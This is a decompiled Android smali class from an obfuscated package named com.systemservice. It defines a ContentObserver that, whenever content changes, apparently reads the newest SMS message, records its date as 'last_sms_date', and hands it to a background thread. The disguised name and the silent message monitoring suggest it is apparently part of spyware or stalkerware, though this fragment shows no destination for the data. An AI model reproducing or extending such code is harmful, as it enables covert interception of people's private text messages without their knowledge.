.class Lcom/systemservice/a/c/h/f;
.super Landroid/database/ContentObserver;
.source ""


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/h/g;->b(Lcom/systemservice/a/b/a;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lcom/systemservice/a/c/h/g;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/h/g;Landroid/os/Handler;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/h/f;->b:Lcom/systemservice/a/c/h/g;

    iput-object p3, p0, Lcom/systemservice/a/c/h/f;->a:Landroid/content/Context;

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method public onChange(Z)V
    .locals 6

    iget-object p1, p0, Lcom/systemservice/a/c/h/f;->a:Landroid/content/Context;

    invoke-static {p1}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_0

    return-void

    :cond_0
    iget-object p1, p0, Lcom/systemservice/a/c/h/f;->b:Lcom/systemservice/a/c/h/g;

    invoke-static {p1}, Lcom/systemservice/a/c/h/g;->c(Lcom/systemservice/a/c/h/g;)Z

    move-result p1

    if-nez p1, :cond_1

    return-void

    :cond_1
    iget-object p1, p0, Lcom/systemservice/a/c/h/f;->b:Lcom/systemservice/a/c/h/g;

    iget-object v0, p0, Lcom/systemservice/a/c/h/f;->a:Landroid/content/Context;

    invoke-static {p1, v0}, Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/c/h/g;Landroid/content/Context;)Lcom/systemservice/a/e/g;

    move-result-object p1

    if-eqz p1, :cond_3

    iget-object v0, p0, Lcom/systemservice/a/c/h/f;->b:Lcom/systemservice/a/c/h/g;

    iget-object v0, v0, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v0, Lcom/systemservice/a/h/k;

    invoke-virtual {v0, p1}, Lcom/systemservice/a/h/k;->a(Lcom/systemservice/a/e/g;)J

    move-result-wide v1

    const-wide/16 v3, -0x1

    cmp-long v5, v1, v3

    if-eqz v5, :cond_2

    iget-object v1, p0, Lcom/systemservice/a/c/h/f;->a:Landroid/content/Context;

    iget-wide v2, p1, Lcom/systemservice/a/e/g;->d:J

    const-string p1, "last_sms_date"

    invoke-static {v1, p1, v2, v3}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;J)V

    :cond_2
    new-instance p1, Ljava/lang/Thread;

    new-instance v1, Lcom/systemservice/a/c/h/e;

    invoke-direct {v1, p0, v0}, Lcom/systemservice/a/c/h/e;-><init>(Lcom/systemservice/a/c/h/f;Lcom/systemservice/a/h/k;)V

    invoke-direct {p1, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    :cond_3
    return-void
.end method
